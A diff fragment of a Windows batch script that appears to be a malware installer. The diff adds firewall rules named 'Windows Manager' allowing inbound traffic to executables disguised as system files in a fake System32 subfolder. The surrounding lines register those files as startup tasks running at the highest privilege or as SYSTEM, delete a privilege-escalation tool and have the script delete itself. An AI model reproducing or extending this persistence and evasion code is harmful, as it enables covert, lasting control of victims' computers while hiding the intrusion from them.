@@ -56,6 +56,9 @@ SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.ex
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 cls
+netsh advfirewall firewall add rule name="Windows Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows.exe" enable=yes
+netsh advfirewall firewall add rule name="Windows Manager 2" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows2.exe" enable=yes
+cls
 del /f NSudo.exe
 cls
 call :deleteSelf&exit
